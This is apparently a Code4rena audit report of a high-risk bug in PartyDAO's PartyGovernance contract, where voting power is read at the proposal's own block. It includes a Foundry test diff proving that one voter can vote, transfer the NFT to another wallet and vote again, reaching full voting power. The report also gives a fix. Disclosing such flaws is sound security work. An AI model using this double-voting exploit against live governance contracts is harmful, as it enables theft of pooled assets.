## Tags

- bug
- 3 (High Risk)
- high quality report
- resolved
- sponsor confirmed

# [PartyGovernance: Can vote multiple times by transferring NFT in same block as proposal](https://github.com/code-423n4/2022-09-party-findings/issues/113) 

# Lines of code

https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L594


# Vulnerability details

## Impact
`PartyGovernanceNFT` uses the voting power at the time of proposal when calling `accept`. The problem with that is that a user can vote, transfer the NFT (and the voting power) to a different wallet, and then vote from this second wallet again during the same block that the proposal was created. 
This can also be repeated multiple times to get an arbitrarily high voting power and pass every proposal unanimously. 

The consequences of this are very severe. Any user (no matter how small his voting power is) can propose and pass arbitrary proposals animously and therefore steal all assets (including the precious tokens) out of the party.

## Proof Of Concept
This diff shows how a user with a voting power of 50/100 gets a voting power of 100/100 by transferring the NFT to a second wallet that he owns and voting from that one:
```diff
--- a/sol-tests/party/PartyGovernanceUnit.t.sol
+++ b/sol-tests/party/PartyGovernanceUnit.t.sol
@@ -762,6 +762,7 @@ contract PartyGovernanceUnitTest is Test, TestUtils {
         TestablePartyGovernance gov =
             _createGovernance(100e18, preciousTokens, preciousTokenIds);
         address undelegatedVoter = _randomAddress();
+        address recipient = _randomAddress();
         // undelegatedVoter has 50/100 intrinsic VP (delegated to no one/self)
         gov.rawAdjustVotingPower(undelegatedVoter, 50e18, address(0));
 
@@ -772,38 +773,13 @@ contract PartyGovernanceUnitTest is Test, TestUtils {
         // Undelegated voter submits proposal.
         vm.prank(undelegatedVoter);
         assertEq(gov.propose(proposal, 0), proposalId);
-
-        // Try to execute proposal (fail).
-        vm.expectRevert(abi.encodeWithSelector(
-            PartyGovernance.BadProposalStatusError.selector,
-            PartyGovernance.ProposalStatus.Voting
-        ));
-        vm.prank(undelegatedVoter);
-        gov.execute(
-            proposalId,
-            proposal,
-            preciousTokens,
-            preciousTokenIds,
-            "",
-            ""
-        );
-
-        // Skip past execution delay.
-        skip(defaultGovernanceOpts.executionDelay);
-        // Try again (fail).
-        vm.expectRevert(abi.encodeWithSelector(
-            PartyGovernance.BadProposalStatusError.selector,
-            PartyGovernance.ProposalStatus.Voting
-        ));
-        vm.prank(undelegatedVoter);
-        gov.execute(
-            proposalId,
-            proposal,
-            preciousTokens,
-            preciousTokenIds,
-            "",
-            ""
-        );
+        (, PartyGovernance.ProposalStateValues memory valuesPrev) = gov.getProposalStateInfo(proposalId);
+        assertEq(valuesPrev.votes, 50e18);
+        gov.transferVotingPower(undelegatedVoter, recipient, 50e18); //Simulate NFT transfer
+        vm.prank(recipient);
+        gov.accept(proposalId, 0);
+        (, PartyGovernance.ProposalStateValues memory valuesAfter) = gov.getProposalStateInfo(proposalId);
+        assertEq(valuesAfter.votes, 100e18);
     }
```

## Recommended Mitigation Steps
You should query the voting power at `values.proposedTime - 1`. This value is already finalized when the proposal is created and therefore cannot be manipulated by repeatedly transferring the voting power to different wallets.